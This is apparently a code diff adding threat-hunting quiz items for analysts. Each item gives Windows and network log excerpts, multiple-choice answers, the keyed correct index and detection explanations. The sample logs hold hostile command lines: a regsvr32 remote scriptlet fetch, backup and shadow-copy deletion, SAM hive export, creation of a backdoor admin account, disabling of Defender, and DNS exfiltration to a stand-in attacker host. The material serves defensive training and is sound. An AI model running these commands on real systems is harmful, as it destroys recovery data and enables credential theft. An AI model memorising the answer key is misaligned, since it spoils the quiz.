+options:["A Windows backup restoring a file from a 2019 system image","Normal behavior when copying files between NTFS volumes","An attacker backdating the file to hide it outside the forensic investigation window","NTFS compression modifying file metadata automatically"],
+correct:2,
+explain:`<h4>Explanation</h4><p>Timestomping modifies NTFS $STANDARD_INFORMATION timestamps so the file appears to predate the incident — making it invisible when investigators filter by date range. Sysmon EID 2 preserves the PreviousCreationUtcTime, exposing the manipulation. Advanced forensics: compare $SI vs $FN timestamps in the MFT — $FN is harder to modify.</p><p><strong>Hunt:</strong> Sysmon EID 2, large gaps between $SI and $FN timestamps, Temp files with pre-OS-install creation dates.</p>`},
+
+{id:"H15",title:"Remote Command Execution via Share",mitre:"T1021.002",diff:"Medium",
+scenario:"On a server, you notice a service that wasn't there yesterday just installed itself and immediately spawned a command shell that ran several reconnaissance commands. Correlating with network logs, another internal host authenticated to this server around the same time via SMB. IT has no record of this activity.",
+log:`<span class="hl-cyan">[Security EID 4624 – Network Logon]</span>
+LogonType: 3  TargetUser: Administrator  SrcIP: 10.0.0.22
+
+<span class="hl-cyan">[System EID 7045 – Service Installed]</span>
+ServiceName: <span class="hl-red">PSEXESVC</span>
+BinaryPath:  <span class="hl-red">C:\\Windows\\PSEXESVC.exe</span>
+
+<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+ParentImage: C:\\Windows\\PSEXESVC.exe
+Image:       C:\\Windows\\System32\\cmd.exe
+CommandLine: cmd.exe /c <span class="hl-red">whoami && ipconfig /all && net user</span>`,
+hint1:"MITRE ATT&CK: T1021.002 — Remote Services: SMB/Windows Admin Shares",
+options:["IT admin using Sysinternals PsExec for legitimate remote management","Lateral movement: an attacker pivoting from 10.0.0.22 and running discovery commands remotely","WinRM creating a temporary service for remote script execution","SCCM pushing a software installation package to the server"],
+correct:1,
+explain:`<h4>Explanation</h4><p>PsExec authenticates via SMB, drops PSEXESVC.exe to ADMIN$, installs it as a service, and executes commands remotely. The discovery commands (whoami, ipconfig, net user) are post-compromise situational awareness gathering. PSEXESVC appearing on any non-IT machine is almost always malicious.</p><p><strong>Detect:</strong> EID 7045 with PSEXESVC name, correlated LogonType 3, cmd.exe spawned from PSEXESVC.exe.</p>`},
+
+{id:"H16",title:"AppLocker Bypass via Signed Binary",mitre:"T1218.010",diff:"Medium",
+scenario:"AppLocker is enforced on this workstation — users can't run unsigned executables. Yet your EDR shows code was executed from a remote URL. The process that executed it is a signed Microsoft binary typically used for registering COM objects. No AppLocker alert fired. How did they get around it?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+Image:       C:\\Windows\\System32\\<span class="hl-cyan">regsvr32.exe</span>
+CommandLine: regsvr32.exe /s /n /u /i:<span class="hl-red">http://198.51.100.77/payload.sct</span> scrobj.dll
+User:        CORP\\intern01
+ParentImage: C:\\Windows\\System32\\cmd.exe`,
+hint1:"MITRE ATT&CK: T1218.010 — System Binary Proxy Execution: Regsvr32",
+options:["A developer registering a COM object for an application","A signed Microsoft binary abused to download and execute a remote scriptlet, bypassing AppLocker","Windows registering a new DLL after software installation","Legitimate use of scrobj.dll for Windows Scripting Host"],
+correct:1,
+explain:`<h4>Explanation</h4><p>'Squiblydoo': regsvr32.exe (signed, trusted Microsoft binary) downloads and executes a COM scriptlet (.sct) containing JScript or VBScript via scrobj.dll. AppLocker whitelists signed binaries, so regsvr32 runs without restriction. The .sct is fetched into memory — partially fileless. No alert from most AV solutions.</p><p><strong>Detect:</strong> regsvr32 with /i: pointing to HTTP, scrobj.dll in the command line, network connections originating from regsvr32.exe.</p>`},
+
+{id:"H17",title:"Three Commands — Critical Concern",mitre:"T1490",diff:"Easy",
+scenario:"Within a 90-second window, three separate command-line utilities execute on the same workstation. None are unusual tools individually — IT uses them legitimately. But your SIEM correlates them as a group and fires a critical alert. Looking at what each command actually does, why might seeing all three together be extremely alarming?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+Image: vssadmin.exe  CommandLine: vssadmin.exe <span class="hl-red">delete shadows /all /quiet</span>
+
+Image: wbadmin.exe   CommandLine: wbadmin.exe <span class="hl-red">delete catalog -quiet</span>
+
+Image: bcdedit.exe   CommandLine: bcdedit.exe <span class="hl-red">/set {default} recoveryenabled No</span>`,
+hint1:"MITRE ATT&CK: T1490 — Inhibit System Recovery",
+options:["IT admin performing pre-upgrade disk cleanup on a scheduled maintenance window","Windows Disk Cleanup removing old restore points automatically","Pre-encryption preparation: all Windows-native recovery mechanisms being destroyed","Backup software performing a snapshot chain rotation"],
+correct:2,
+explain:`<h4>Explanation</h4><p>This exact three-command sequence — vssadmin (delete Shadow Copies), wbadmin (delete Backup catalog), bcdedit (disable Recovery) — is found in virtually every major ransomware family: Ryuk, Conti, LockBit, BlackCat. Detection of this pattern means encryption likely hasn't started yet. Rapid response can still save the environment. Isolate immediately.</p><p><strong>CRITICAL:</strong> Alert on this three-command correlation. Isolate the host before encryption begins.</p>`},
+
+{id:"H18",title:"Sensitive Hive Files Exported",mitre:"T1003.002",diff:"Medium",
+scenario:"A domain admin account runs three consecutive reg.exe commands on a workstation, exporting specific registry hives to a temp directory. This wasn't part of any change request. An experienced analyst immediately recognizes what these three specific files, taken together, allow an attacker to do. Do you?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – reg.exe]</span>
+Image:       C:\\Windows\\System32\\reg.exe
+CommandLine: reg save <span class="hl-red">HKLM\\SAM</span> C:\\Temp\\sam.hive
+             reg save <span class="hl-red">HKLM\\SYSTEM</span> C:\\Temp\\system.hive
+             reg save <span class="hl-red">HKLM\\SECURITY</span> C:\\Temp\\security.hive
+User:        CORP\\Domain Admin`,
+hint1:"MITRE ATT&CK: T1003.002 — OS Credential Dumping: Security Account Manager",
+options:["A backup script saving registry hives for disaster recovery","Exporting SAM/SYSTEM/SECURITY together enables full offline credential extraction — local hashes and cached domain credentials","Windows VSS creating a registry snapshot for system restore","Admin exporting registry settings for a workstation migration project"],
+correct:1,
+explain:`<h4>Explanation</h4><p>SAM (local password hashes) + SYSTEM (boot key to decrypt SAM) + SECURITY (cached domain credentials / MSCache) = complete offline credential extraction using secretsdump.py. No additional access to the domain needed. The combination of all three is the tell — individual hive exports are less alarming.</p><p><strong>Detect:</strong> reg.exe saving all three hives in the same session, exported to non-standard paths.</p>`},
+
+{id:"H19",title:"System Process With Wrong Parent",mitre:"T1055.012",diff:"Hard",
+scenario:"Task Manager shows svchost.exe running — nothing unusual there. But Sysmon reveals this particular instance has no -k service group argument, was spawned by a process in a malware directory, and another process injected into it with full access rights. Something is using svchost as a disguise. What technique does this describe?",
+log:`<span class="hl-cyan">[Sysmon EID 8 – CreateRemoteThread]</span>
+SourceImage: C:\\Malware\\loader.exe
+TargetImage: <span class="hl-red">C:\\Windows\\System32\\svchost.exe</span>
+
+<span class="hl-cyan">[Sysmon EID 1 – svchost anomaly]</span>
+Image:       svchost.exe
+CommandLine: svchost.exe  <span class="hl-red">(no -k flag)</span>
+ParentImage: <span class="hl-red">C:\\Malware\\loader.exe</span>
+
+<span class="hl-cyan">[Sysmon EID 10 – Process Access]</span>
+GrantedAccess: <span class="hl-red">0x1FFFFF</span> (PROCESS_ALL_ACCESS)`,
+hint1:"MITRE ATT&CK: T1055.012 — Process Injection: Process Hollowing",
+options:["A legitimate svchost instance handling a new Windows service","Malicious code injected into a hollowed svchost process — the system process is a disguise for attacker activity","Windows creating a temporary svchost for a one-time task","Memory dump of svchost taken by Windows Error Reporting"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Process hollowing: loader creates svchost in a SUSPENDED state, unmaps its legitimate code, writes malicious shellcode into the empty address space, then resumes execution. Task Manager shows svchost.exe — but it's running attacker code. Detection signatures: svchost without -k flag, non-services.exe parent, CreateRemoteThread targeting system processes, PROCESS_ALL_ACCESS (0x1FFFFF).</p><p><strong>Detect:</strong> Sysmon EID 8 targeting system processes, svchost without -k from a non-system parent process.</p>`},
+
+{id:"H20",title:"High-Volume LDAP Enumeration",mitre:"T1087.002",diff:"Easy",
+scenario:"Your DC security logs show a regular domain user account performing thousands of LDAP read operations in just a few seconds — far beyond anything a human could generate manually. A known open-source red team tool used to map Active Directory attack paths was found on the user's workstation. What's the risk?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+Image:       C:\\Tools\\<span class="hl-red">SharpHound.exe</span>
+CommandLine: SharpHound.exe <span class="hl-red">--CollectionMethod All --OutputDirectory C:\\Temp</span>
+User:        CORP\\jdoe
+
+<span class="hl-cyan">[Security EID 4662 – Object Access]</span>
+SubjectUser: jdoe
+ObjectType:  Domain-DNS
+Operations:  <span class="hl-red">8472 LDAP reads in 4 seconds</span>`,
+hint1:"MITRE ATT&CK: T1087.002 — Account Discovery: Domain Account (BloodHound/SharpHound)",
+options:["AD admin running a health check on domain trust relationships","SharpHound collecting AD relationship data to map privilege escalation paths for an attacker","Windows Global Catalog performing an auto-sync operation","A backup agent inventorying domain objects for disaster recovery"],
+correct:1,
+explain:`<h4>Explanation</h4><p>SharpHound (the BloodHound collector) enumerates all AD relationships: group memberships, local admin rights, active sessions, ACLs, GPO links, and trust paths. --CollectionMethod All captures everything. The resulting dataset is imported into BloodHound to visually map attack paths to Domain Admin. 8,472 LDAP ops in 4 seconds is only possible via automation.</p><p><strong>Detect:</strong> High-volume LDAP reads from non-service accounts, SharpHound.exe artifacts, ACL enumeration query patterns on the DC.</p>`},
+
+{id:"H21",title:"Office Application Spawning Shell",mitre:"T1566.001",diff:"Easy",
+scenario:"A finance employee opened an email attachment this morning. Within seconds of opening it, your EDR fires: the Office application that opened the file has spawned a command shell, which in turn launched PowerShell. PowerShell then made an outbound HTTPS connection. The user didn't notice anything unusual — the file appeared to open normally.",
+log:`<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+ParentImage: C:\\...Office16\\<span class="hl-cyan">WINWORD.EXE</span>
+Image:       <span class="hl-red">C:\\Windows\\System32\\cmd.exe</span>
+CommandLine: cmd.exe /c powershell -W h -NoP -Enc <span class="hl-red">JABzAD0...</span>
+
+<span class="hl-cyan">[Sysmon EID 3 – Network Connection]</span>
+Image:       powershell.exe
+DestIP:      <span class="hl-red">185.220.101.33:443</span>`,
+hint1:"MITRE ATT&CK: T1566.001 — Phishing: Spearphishing Attachment (Malicious Macro)",
+options:["Microsoft Word performing a cloud sync operation for the document","A malicious macro in the document spawning a reverse shell via PowerShell — C2 callback initiated","Word launching an embedded hyperlink to an HTTPS resource","Office auto-update downloading patches via a background PowerShell process"],
+correct:1,
+explain:`<h4>Explanation</h4><p>WINWORD → cmd.exe → powershell.exe → outbound HTTPS is one of the most-detected malicious process chains. Legitimate Word never spawns cmd.exe. The VBA macro auto-executed when the user clicked 'Enable Content.' The encoded PS payload establishes a C2 callback — likely Cobalt Strike, Havoc, or Sliver.</p><p><strong>Detect:</strong> Office applications spawning cmd.exe or PowerShell, network connections from PowerShell with an Office parent process.</p>`},
+
+{id:"H22",title:"Security Tool Disabled via PowerShell",mitre:"T1562.001",diff:"Easy",
+scenario:"Your security stack sends an alert: Windows Defender real-time protection is off on a workstation. Checking Sysmon, you see PowerShell modified three registry keys under the Defender policy path within a 30-second window immediately before the alert. No admin initiated this. What does this activity typically precede?",
+log:`<span class="hl-cyan">[Sysmon EID 13 – Registry Write]</span>
+Image:        powershell.exe
+TargetObject: <span class="hl-red">HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware</span>
+Details:      DWORD: <span class="hl-red">0x00000001</span>
+
+<span class="hl-cyan">[Sysmon EID 1 – PowerShell]</span>
+CommandLine: <span class="hl-red">Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true</span>`,
+hint1:"MITRE ATT&CK: T1562.001 — Impair Defenses: Disable or Modify Tools",
+options:["Sysadmin disabling Defender to whitelist a legitimate security tool","Pre-execution defense removal: Defender being disabled to blind host detection before the main payload runs","Windows Update temporarily disabling Defender while applying a patch","Group Policy updating Defender configuration for a security hardening baseline"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Disabling Defender is almost always a prerequisite step — attackers blind the primary host-based detection layer before dropping or running their main payload. The three-parameter Set-MpPreference command disables real-time monitoring, download scanning, and behavior monitoring simultaneously. Legitimate Defender changes go through centralized GPO — not ad-hoc PowerShell from a workstation.</p><p><strong>Detect:</strong> Registry writes to Defender policy keys, Set-MpPreference with disabling parameters, Defender service stop events (EID 7036).</p>`},
+
+{id:"H23",title:"Non-DC Account Using Replication Rights",mitre:"T1003.006",diff:"Hard",
+scenario:"While reviewing DC audit logs, you notice a service account normally used for monitoring is listed in EID 4662 with three specific Active Directory replication permissions. Domain Controllers use these permissions constantly — but this is not a DC. The account shouldn't have these rights at all. What could an attacker do with them?",
+log:`<span class="hl-cyan">[Security EID 4662 – Object Operation]</span>
+SubjectUser: <span class="hl-red">svc_monitoring</span>
+ObjectType:  domainDNS
+AccessList:
+  <span class="hl-red">DS-Replication-Get-Changes</span>
+  <span class="hl-red">DS-Replication-Get-Changes-All</span>
+  <span class="hl-red">DS-Replication-Get-Changes-In-Filtered-Set</span>`,
+hint1:"MITRE ATT&CK: T1003.006 — OS Credential Dumping: DCSync",
+options:["A domain controller performing routine AD replication to a replica","A compromised service account using replication rights to pull all domain password hashes remotely","An AD health monitor verifying replication consistency between DCs","A secondary DC syncing its database from the primary controller"],
+correct:1,
+explain:`<h4>Explanation</h4><p>DCSync (used by Mimikatz lsadump::dcsync) simulates a DC's replication request to pull any user's credential hash — including krbtgt — without touching LSASS. Any non-DC account appearing in EID 4662 with these three replication GUIDs is either compromised or being abused. Legitimate replication only originates from DC computer accounts (ending in $).</p><p><strong>Detect:</strong> EID 4662 with DS-Replication GUIDs from non-DC accounts. Audit who holds DS-Replication rights in AD.</p>`},
+
+{id:"H24",title:"SYSTEM Process Spawning User Commands",mitre:"T1047",diff:"Medium",
+scenario:"On a workstation that received a remote WMI command, the WMI Provider Host process — running as SYSTEM — just spawned a command shell that added a new local user and granted them administrator rights. WMI executed something it was told to run remotely. Who told it to, and from where?",
+log:`<span class="hl-cyan">[Sysmon EID 1 – Process Create]</span>
+ParentImage: <span class="hl-red">C:\\Windows\\System32\\wbem\\WmiPrvSE.exe</span>
+Image:       C:\\Windows\\System32\\cmd.exe
+CommandLine: cmd.exe /Q /c <span class="hl-red">net user hacker P@ss123! /add && net localgroup administrators hacker /add</span>
+User:        NT AUTHORITY\\SYSTEM`,
+hint1:"MITRE ATT&CK: T1047 — Windows Management Instrumentation",
+options:["Windows Management Instrumentation running a scheduled maintenance script","WMI used as a remote execution mechanism to create a backdoor local admin account","A monitoring agent using WMI to query system performance counters","SCCM running a software inventory scan via WMI providers"],
+correct:1,
+explain:`<h4>Explanation</h4><p>WMI (Win32_Process.Create or wmic) executes arbitrary commands via WmiPrvSE.exe as SYSTEM — no service installation required, making it quieter than PsExec. The commands create a backdoor local admin account 'hacker'. WmiPrvSE spawning cmd.exe is the key detection signature for WMI-based remote code execution.</p><p><strong>Detect:</strong> WmiPrvSE.exe spawning cmd.exe or PowerShell, net user/localgroup commands from SYSTEM context.</p>`},
+
+{id:"H25",title:"Admin Account With No AD Record",mitre:"T1558.001",diff:"Hard",
+scenario:"You're reviewing Kerberos logs and find a valid, fully-authenticated session for an 'administrator' account with some of the most privileged Windows rights possible. When you query Active Directory, the account doesn't exist. Yet the domain controller accepted and honored the Kerberos ticket. How is this possible?",
+log:`<span class="hl-cyan">[Security EID 4769 – Service Ticket]</span>
+AccountName:   <span class="hl-red">administrator</span>
+EncryptionType: <span class="hl-red">0x17</span> (RC4-HMAC)
+ServiceName:   krbtgt
+IpAddress:     10.0.0.88
+
+<span class="hl-cyan">[Security EID 4672 – Special Logon]</span>
+AccountName: administrator
+Privileges:  <span class="hl-red">SeDebugPrivilege, SeTcbPrivilege, SeImpersonatePrivilege</span>
+
+<span class="hl-yellow">ANOMALY: Account 'administrator' not found in AD LDAP at same timestamp</span>`,
+hint1:"MITRE ATT&CK: T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket",
+options:["A legitimate administrator with a valid Kerberos ticket in an active session","A DC replication event creating a temporary administrator account","A forged Kerberos ticket granting authentication as a non-existent admin account — DC validated the crypto, not the identity","Windows Credential Manager replaying a cached Kerberos ticket"],
+correct:2,
+explain:`<h4>Explanation</h4><p>The Golden Ticket is forged using the krbtgt NTLM hash. The DC validates the cryptographic signature only — it doesn't check whether the account actually exists in AD. Indicators: RC4 on a TGT (not AES), privileged accounts not present in AD, unusual ticket lifetimes, high-privilege Logon Rights appearing unexpectedly. Remediation: rotate krbtgt password TWICE with a 48-hour gap between rotations.</p><p><strong>Detect:</strong> EID 4769 RC4 TGTs for high-privilege accounts, account SID mismatches, accounts with special privileges not found in LDAP.</p>`}
+];
+
+const netQ=[
+{id:"N1",title:"Unusual DNS Query Pattern",mitre:"T1071.004",diff:"Hard",
+scenario:"A single endpoint is generating almost 5,000 DNS queries in 6 minutes — all to subdomains of the same external domain. The subdomain labels are long, appear random, and follow no consistent naming convention. Normal DNS activity for this host is under 50 queries per hour. What's going on here?",
+log:`<span class="hl-cyan">[DNS Firewall Log]</span>
+10.0.1.55 → QUERY: <span class="hl-red">aGVsbG8gd29ybGQ.exfil.attacker.com</span>  TXT
+10.0.1.55 → QUERY: <span class="hl-red">dGhpcyBpcyBzZWNy.exfil.attacker.com</span>  TXT
+10.0.1.55 → QUERY: <span class="hl-red">ZXQgZGF0YSBiZWlu.exfil.attacker.com</span>  TXT
+...
+<span class="hl-red">4,892 TXT queries to *.exfil.attacker.com in 6 minutes</span>
+Baseline: host averages 45 DNS queries/hour`,
+hint1:"MITRE ATT&CK: T1071.004 — Application Layer Protocol: DNS",
+options:["A DNS client repeatedly querying a misconfigured or unreachable domain","Data being encoded and exfiltrated in DNS subdomain labels — the DNS protocol used as a covert channel","Legitimate DNS load balancing distributing queries dynamically across subdomains","A CDN resolving subdomains for content delivery"],
+correct:1,
+explain:`<h4>Explanation</h4><p>DNS tunneling encodes data in subdomain labels (up to 63 chars each) and TXT record responses. Tools like DNScat2 and Iodine use this to exfiltrate data or tunnel full C2 sessions over DNS — bypassing most proxy and firewall controls. Detection: high-volume TXT queries to a single parent domain, long high-entropy subdomain labels, Base64 patterns in query names.</p><p><strong>Hunt:</strong> DNS TXT query rate per host, subdomain entropy analysis, parent domain with no email infrastructure (no MX record).</p>`},
+
+{id:"N2",title:"Oddly Regular Outbound Traffic",mitre:"T1071.001",diff:"Medium",
+scenario:"Your proxy logs show an internal host making HTTPS connections to the same external IP every 5 minutes — exactly. The connection has been going for 12 hours. Payload sizes are nearly identical each time. The connection happens whether or not a user is logged in. The User-Agent string looks like an outdated browser version. What's the likely explanation?",
+log:`<span class="hl-cyan">[Proxy Log – Intervals]</span>
+10.0.2.33 → 198.51.100.99:443  HTTPS  00:00:14  292 bytes
+10.0.2.33 → 198.51.100.99:443  HTTPS  00:05:14  289 bytes
+10.0.2.33 → 198.51.100.99:443  HTTPS  00:10:15  291 bytes
+10.0.2.33 → 198.51.100.99:443  HTTPS  00:20:14  288 bytes
+...
+<span class="hl-red">144 connections in 12 hours | Avg interval: 299.9s | Jitter: ±2s</span>
+UserAgent: <span class="hl-red">Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span>`,
+hint1:"MITRE ATT&CK: T1071.001 — Application Layer Protocol: Web Protocols (C2 Beaconing)",
+options:["A cloud backup application syncing every 5 minutes on a schedule","A malware implant checking in with its command-and-control server on a programmatic heartbeat interval","Windows Update verifying patch status on a regular schedule","A web dashboard auto-refreshing every 5 minutes"],
+correct:1,
+explain:`<h4>Explanation</h4><p>C2 beaconing: near-perfect 5-minute intervals with ±2s jitter is programmatic — humans don't generate traffic this regularly. The IE11 User-Agent (Trident/7.0) on a modern Windows host is a Cobalt Strike default malleable profile artifact that wasn't customized. Off-hours activity during a 12-hour window confirms no human is driving it.</p><p><strong>Detect:</strong> Calculate mean/stddev of connection intervals. Low coefficient of variation = beacon. Correlate with the owning process on the endpoint.</p>`},
+
+{id:"N3",title:"Internal Host Scanning All SMB Ports",mitre:"T1210",diff:"Hard",
+scenario:"A single internal workstation contacted every host in three /24 subnets on the same port within 30 seconds. The protocol used is a legacy version your organization disabled last year. On one host that responded, a remote command shell appeared shortly after — spawned from a network share path. What is spreading, and how?",
+log:`<span class="hl-cyan">[Firewall — Internal East-West]</span>
+10.0.0.22 → 10.0.0.55:445  <span class="hl-red">SMBv1</span>  SYN
+10.0.0.22 → 10.0.0.56:445  <span class="hl-red">SMBv1</span>  SYN
+10.0.0.22 → 10.0.0.57:445  <span class="hl-red">SMBv1</span>  SYN
+...
+<span class="hl-red">254 hosts scanned on port 445 in 27 seconds via SMBv1</span>
+
+<span class="hl-cyan">[Sysmon EID 1 on 10.0.0.55]</span>
+Image:       C:\\Windows\\System32\\cmd.exe
+ParentImage: <span class="hl-red">\\\\10.0.0.22\\IPC$</span>`,
+hint1:"MITRE ATT&CK: T1210 — Exploitation of Remote Services (EternalBlue / MS17-010)",
+options:["A file server broadcasting its SMB shares to the local network","Worm-like lateral spread exploiting a critical SMBv1 vulnerability for unauthenticated code execution","Windows Network Discovery probing for shared printers and resources","A backup agent discovering available SMB shares for archival"],
+correct:1,
+explain:`<h4>Explanation</h4><p>EternalBlue (CVE-2017-0144) exploits a buffer overflow in SMBv1 for unauthenticated RCE. The scan pattern — all hosts on a /24 in under 30 seconds via SMBv1 — combined with code execution from a remote IPC$ share matches WannaCry/NotPetya propagation. SMBv1 should be disabled on all modern systems. Isolate 10.0.0.22 immediately.</p><p><strong>Response:</strong> Isolate source host, block SMBv1 at firewall, check all hosts that accepted connections for the DOUBLEPULSAR backdoor.</p>`},
+
+{id:"N4",title:"HTTPS Traffic With a Suspicious Certificate",mitre:"T1071.001",diff:"Hard",
+scenario:"SSL inspection flags an HTTPS connection to an unknown IP that's presenting a certificate with a Microsoft-related domain in the Common Name — but the certificate is self-signed, one day old, and the IP doesn't belong to Microsoft. Threat intel also matches the TLS fingerprint to a known offensive framework. What is this traffic?",
+log:`<span class="hl-cyan">[TLS/SSL Analysis]</span>
+Src: 10.0.3.21  Dst: 203.0.113.88:443
+
+JA3:  <span class="hl-red">a0e9f5d64349fb13191bc781f81f42e1</span>
+JA3S: <span class="hl-red">ae4edc6faf64d08308082ad26be60767</span>
+
+<span class="hl-cyan">[Threat Intel Match]</span>
+JA3 <span class="hl-red">a0e9f5d...</span> = <span class="hl-red">Known Cobalt Strike Beacon default fingerprint</span>
+
+Certificate CN:     <span class="hl-red">jquery.com</span>
+Certificate Issuer: <span class="hl-red">Let's Encrypt</span>
+Cert Age:           <span class="hl-red">1 day old</span>`,
+hint1:"MITRE ATT&CK: T1071.001 — Application Layer Protocol: Web Protocols (Cobalt Strike C2)",
+options:["A developer connecting to the jQuery CDN for a library download","Cobalt Strike C2 traffic: a beacon using a mimicked certificate and malleable profile to blend as legitimate HTTPS","A browser loading jQuery from a CDN cache","A Let's Encrypt renewal for an internal web server proxied externally"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Cobalt Strike malleable C2 profiles can mimic legitimate traffic patterns, but the Beacon's TLS implementation produces a distinctive JA3 fingerprint catalogued by threat intel. A 1-day-old Let's Encrypt cert for 'jquery.com' from an unknown IP is attacker infrastructure — the real jQuery CDN uses a commercial CA with certs valid for over a year.</p><p><strong>Detect:</strong> JA3/JARM threat intel matching, newly-registered domains with LE certs mimicking popular CDNs, cert age under 7 days for well-known brand names.</p>`},
+
+{id:"N5",title:"Overnight Upload Spike — Wrong Tool",mitre:"T1567.002",diff:"Medium",
+scenario:"Your CASB wakes you up at midnight: a single endpoint uploaded 2.65 GB to a legitimate cloud storage service in under an hour. The host's normal daily upload volume is under 50 MB. The User-Agent making the upload isn't a browser or a desktop sync client — it's a scripting library. No user is logged in.",
+log:`<span class="hl-cyan">[Proxy Log]</span>
+Host:        10.0.4.100
+URL:         https://drive.google.com/upload/resumable
+Method:      POST
+BytesSent:   <span class="hl-red">2,847,392,048</span>  (2.65 GB)
+Duration:    3847 seconds
+UserAgent:   <span class="hl-red">python-requests/2.28.0</span>
+Username:    <span class="hl-red">N/A</span> (unauthenticated proxy)
+
+Baseline: Host avg daily upload = <span class="hl-yellow">42 MB</span>`,
+hint1:"MITRE ATT&CK: T1567.002 — Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+options:["A user manually backing up work files to Google Drive before a laptop refresh","The Google Drive sync client catching up after a long period of being offline","A scripted bulk upload to cloud storage — automated exfiltration using a trusted platform to evade controls","IT performing an authorized cloud migration using the Google Drive API"],
+correct:2,
+explain:`<h4>Explanation</h4><p>python-requests is a Python HTTP library — browsers and sync clients don't use it. A scripted 2.65 GB upload to cloud storage at midnight with no authenticated user session (63x above daily baseline) is automated exfiltration. Using legitimate cloud services (Google Drive) evades destination-based controls since the domain has an excellent reputation.</p><p><strong>Detect:</strong> Upload volume anomalies per host, non-browser User-Agents to cloud storage APIs, off-hours large transfers to file-sharing platforms.</p>`},
+
+{id:"N6",title:"Gateway Suddenly Has a New MAC",mitre:"T1557.002",diff:"Medium",
+scenario:"Your network IDS fires: hosts across the 10.0.5.0/24 subnet are receiving unsolicited ARP replies claiming the default gateway's IP belongs to a MAC address you don't recognize. The legitimate gateway MAC hasn't changed. These ARP replies are arriving once per second from a host inside the subnet. What is happening to client traffic on this segment?",
+log:`<span class="hl-cyan">[Switch Log / IDS Alert]</span>
+ARP Reply: IP 10.0.5.1 (gateway) is-at <span class="hl-red">aa:bb:cc:dd:ee:ff</span>
+           [Previously: 10.0.5.1 is-at <span class="hl-green">00:11:22:33:44:55</span>]
+           Source: <span class="hl-red">10.0.5.77</span>
+
+<span class="hl-red">Gratuitous, unsolicited ARP replies — repeated every 1 second</span>
+Multiple hosts updated ARP cache with attacker MAC aa:bb:cc:dd:ee:ff`,
+hint1:"MITRE ATT&CK: T1557.002 — Adversary-in-the-Middle: ARP Cache Poisoning",
+options:["The network gateway updating its MAC address after a firmware upgrade","ARP cache poisoning: all subnet traffic for the gateway is being redirected through an attacker's machine","A new managed switch updating ARP tables during network topology learning","Dynamic ARP load-balancing across redundant gateway interfaces"],
+correct:1,
+explain:`<h4>Explanation</h4><p>ARP poisoning poisons client ARP caches so all traffic destined for the gateway flows through the attacker first. The attacker can capture cleartext credentials, strip HTTPS (SSLstrip), or inject malicious content into HTTP responses. Hosts accept gratuitous ARP replies without verification. Tools: Ettercap, arpspoof, Bettercap. Prevention: Dynamic ARP Inspection (DAI) on managed switches.</p><p><strong>Detect:</strong> Unsolicited gratuitous ARPs, gateway MAC changes visible in switch ARP tables.</p>`},
+
+{id:"N7",title:"One Host, a Thousand Ports",mitre:"T1046",diff:"Easy",
+scenario:"Firewall logs show a single internal host contacting another host on over 1,000 different ports within a single second. Only a handful of ports responded. No application on the source host should be doing this. What is this activity, and what will the attacker do with the results?",
+log:`<span class="hl-cyan">[Firewall Log]</span>
+10.0.0.200 → 10.0.1.50:22    SYN → RST/ACK  (closed)
+10.0.0.200 → 10.0.1.50:80    SYN → RST/ACK  (closed)
+10.0.0.200 → 10.0.1.50:443   SYN → <span class="hl-green">SYN/ACK</span>  (OPEN)
+10.0.0.200 → 10.0.1.50:445   SYN → RST/ACK  (closed)
+...
+<span class="hl-red">1,024 ports scanned in 0.8 seconds — nmap default port list pattern</span>`,
+hint1:"MITRE ATT&CK: T1046 — Network Service Discovery",
+options:["A load balancer performing health checks on backend server ports","Automated port reconnaissance: mapping which services are listening to identify exploitation targets","A network monitoring agent performing availability checks on services","Windows automatic service detection on a newly joined network segment"],
+correct:1,
+explain:`<h4>Explanation</h4><p>An nmap SYN scan sends TCP SYN packets without completing the handshake (half-open). Open ports respond with SYN/ACK; closed ports with RST. 1,024 ports in 0.8 seconds is only achievable by automated tooling. The attacker now knows port 443 is open — their next step is exploitation or further enumeration of that service.</p><p><strong>Detect:</strong> Single source contacting >15 unique destination ports on one host within 60 seconds; SYN-only traffic with no data phase.</p>`},
+
+{id:"N8",title:"Broadcast Query Answered by the Wrong Host",mitre:"T1557.001",diff:"Medium",
+scenario:"A workstation failed to resolve a hostname via DNS and fell back to broadcasting a local name resolution query. A host that shouldn't have responded answered it — and when the workstation connected, it was prompted for credentials. Those credentials went somewhere they shouldn't have. How did this happen?",
+log:`<span class="hl-cyan">[Network Capture]</span>
+10.0.6.44  → Multicast   LLMNR Query: "fileserver-corp" (DNS failed)
+<span class="hl-red">10.0.6.99</span>  → 10.0.6.44   LLMNR Response: "fileserver-corp" = 10.0.6.99 [SPOOFED]
+
+10.0.6.44  → 10.0.6.99:445  SMB Negotiate
+10.0.6.99  →                 NTLMv2 Challenge Issued
+
+<span class="hl-cyan">[Responder Output on 10.0.6.99]</span>
+User:  CORP\\jdoe
+Hash:  <span class="hl-red">jdoe::CORP:abcd1234:...  (NTLMv2 NetNTLM)</span>`,
+hint1:"MITRE ATT&CK: T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
+options:["A legitimate hostname resolution fallback working as designed","LLMNR poisoning: an attacker responding to all broadcast name queries and capturing NTLMv2 authentication hashes","DNS failover routing traffic to a secondary resolver","A new host announcing its network presence via mDNS"],
+correct:1,
+explain:`<h4>Explanation</h4><p>Responder (or Inveigh) answers all LLMNR/NBT-NS broadcasts, directing victims to the attacker's host. The victim authenticates via SMB, sending an NTLMv2 hash for offline cracking or relay with ntlmrelayx.py. Prevention: disable LLMNR and NBT-NS via Group Policy (they have no legitimate purpose in most modern environments); enable SMB signing to block relay attacks.</p><p><strong>Detect:</strong> Multiple LLMNR responses from non-DNS hosts, Responder traffic signatures.</p>`},
+
